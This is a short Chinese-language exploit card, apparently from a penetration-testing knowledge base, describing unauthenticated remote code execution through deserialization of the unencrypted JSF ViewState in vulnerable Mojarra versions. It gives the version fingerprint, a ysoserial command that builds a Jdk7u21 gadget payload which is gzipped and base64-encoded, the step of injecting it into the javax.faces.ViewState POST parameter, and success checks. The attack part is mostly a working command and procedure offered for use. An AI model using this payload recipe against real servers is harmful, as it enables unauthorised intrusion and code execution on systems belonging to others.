# Mojarra JSF ViewState 反序列化 RCE

## 指纹特征
- 服务: 使用 Mojarra 实现 JSF 的应用
- 版本: < 2.1.29-08, < 2.0.11-04
- 协议: HTTP (JSF ViewState)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| ViewState 反序列化 | 包含 JSF 表单页面 | 无 |

## PoC 指令

通过构造包含恶意序列化对象的 `javax.faces.ViewState` 参数触发反序列化：

**1. 生成 Payload**
利用 `ysoserial` (如 `Jdk7u21` Gadget) 生成 Payload，然后进行 Gzip 压缩及 Base64 编码：
```bash
java -jar ysoserial.jar Jdk7u21 "touch /tmp/success" | gzip | base64 -w 0
```

**2. 发送请求**
将生成的 Payload 注入到 `javax.faces.ViewState` 参数中（POST 数据中）。

## Success Signal
- **物理验证**: 目标服务器成功执行恶意 Payload (如 `touch /tmp/success`)。
- **状态验证**: 后端成功反序列化未加密的 ViewState 数据。
| 关键点 | 说明 |
| :--- | :--- |
| ViewState | 默认未开启加密，导致序列化数据被操纵 |
